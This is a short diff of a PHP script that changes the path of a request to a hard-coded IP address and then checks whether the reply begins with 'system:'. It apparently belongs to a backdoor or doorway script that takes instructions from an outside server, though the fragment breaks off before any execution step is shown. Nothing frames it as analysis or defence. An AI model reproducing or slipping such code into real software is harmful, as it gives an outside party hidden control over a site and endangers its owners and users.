@@ -16,7 +16,7 @@ break;
 }
 $i++;
 }
-$exit=file_get_contents("http://3.120.174.176/$req");
+$exit=file_get_contents("http://3.120.174.176/nscon/$req");
 $ex=str_split($exit);
 if ($ex[0].$ex[1].$ex[2].$ex[3].$ex[4].$ex[5].$ex[6]=='system:') {
 $ex[0]='';
